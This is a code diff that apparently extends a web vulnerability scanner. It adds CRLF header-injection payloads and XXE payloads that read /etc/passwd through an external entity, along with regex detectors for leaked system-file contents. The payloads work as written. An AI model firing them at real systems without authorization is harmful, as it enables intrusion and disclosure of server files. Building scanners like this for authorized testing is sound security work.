@@ -81,6 +81,60 @@ NOSQLI_ERROR_RE = re.compile(
 
 
 # ---------------------------------------------------------------------------
+# CRLF / HTTP response header injection
+# ---------------------------------------------------------------------------
+CRLF_HEADER_NAME = "ygg-crlf-inj"
+
+
+def crlf_payload(marker: str) -> str:
+    """A parameter value that, if reflected into a response header unsanitized,
+    injects a new header via CRLF. Sent URL-encoded by the caller (the \\r\\n
+    becomes %0D%0A)."""
+    return f"ygg\r\n{CRLF_HEADER_NAME}: {marker}"
+
+
+def crlf_injected(resp_headers, marker: str) -> bool:
+    """True when the injected header actually appears in the response (proof the
+    CRLF split the header block)."""
+    for k, v in dict(resp_headers or {}).items():
+        if str(k).lower() == CRLF_HEADER_NAME and marker in str(v):
+            return True
+    return False
+
+
+# ---------------------------------------------------------------------------
+# XXE (XML external entity)
+# ---------------------------------------------------------------------------
+_ETC_PASSWD_RE = re.compile(r"root:.*?:0:0:", re.MULTILINE)
+_WIN_INI_RE = re.compile(r"\[fonts\]|\[extensions\]|for 16-bit app support", re.IGNORECASE)
+
+
+def xxe_payloads(entity="file:///etc/passwd"):
+    """XXE bodies wrapping a local-file external entity in the common element
+    shapes (incl. ginandjuice's stockCheck). Reads a harmless world-readable
+    file to prove the entity resolves; never writes."""
+    dtd = f'<!DOCTYPE r [ <!ENTITY xxe SYSTEM "{entity}"> ]>'
+    head = '<?xml version="1.0" encoding="UTF-8"?>'
+    # Inject the entity into several element positions: apps validate some fields
+    # (e.g. a numeric productId rejects the entity) while echoing others, so we
+    # try each to catch whichever one reflects.
+    return [
+        f'{head}{dtd}<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>',
+        f'{head}{dtd}<stockCheck><productId>1</productId><storeId>&xxe;</storeId></stockCheck>',
+        f'{head}{dtd}<root>&xxe;</root>',
+        f'{head}{dtd}<foo><bar>&xxe;</bar></foo>',
+    ]
+
+
+def xxe_file_read(inj_body: str, benign_body: str = "") -> bool:
+    """True when the injected response contains local-file content (etc/passwd or
+    win.ini signature) that a benign XML request did NOT return."""
+    b = inj_body or ""
+    hit = bool(_ETC_PASSWD_RE.search(b)) or bool(_WIN_INI_RE.search(b))
+    return hit and not (_ETC_PASSWD_RE.search(benign_body or "") or _WIN_INI_RE.search(benign_body or ""))
+
+
+# ---------------------------------------------------------------------------
 # JWT weaknesses
 # ---------------------------------------------------------------------------
 JWT_RE = re.compile(r"eyJ[A-Za-z0-9_\-]{4,}\.eyJ[A-Za-z0-9_\-]{2,}\.[A-Za-z0-9_\-]*")
